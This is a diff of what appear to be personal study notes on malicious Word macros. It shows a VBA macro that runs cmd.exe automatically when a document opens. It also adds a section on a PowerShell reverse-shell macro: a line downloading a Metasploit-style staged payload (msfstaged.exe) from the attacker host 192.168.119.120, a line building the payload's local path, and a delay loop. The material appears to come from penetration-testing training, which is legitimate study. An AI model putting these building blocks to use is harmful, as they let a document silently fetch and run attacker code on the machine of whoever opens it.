@@ -1,13 +1,32 @@
 # Open CMD
-Sub AutoOpen()
-    MyMacro
-End Sub
-Sub Document_Open()
-    MyMacro
-End Sub
-Sub MyMacro()
-    Dim Str As String
-    Str = "cmd.exe"
-    CreateObject("Wscript.Shell").Run Str
-End Sub
+    Sub AutoOpen()
+        MyMacro
+    End Sub
+    Sub Document_Open()
+        MyMacro
+    End Sub
+    Sub MyMacro()
+        Dim Str As String
+        Str = "cmd.exe"
+        CreateObject("Wscript.Shell").Run Str
+    End Sub
+
+# Introduction of Reverse shell using Powershell macro #
+
+# Syantax to download file and rename it from source
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')
+
+# Get full path of current dir
+Dim exePath As String
+exePath = ActiveDocument.Path + "\msfstaged.exe"
+
+# Wait loop for delay
+    Sub Wait(n As Long)
+        Dim t As Date
+        t = Now
+        Do
+        DoEvents
+        Loop Until Now >= DateAdd("s", n, t)
+    End Sub
+
 
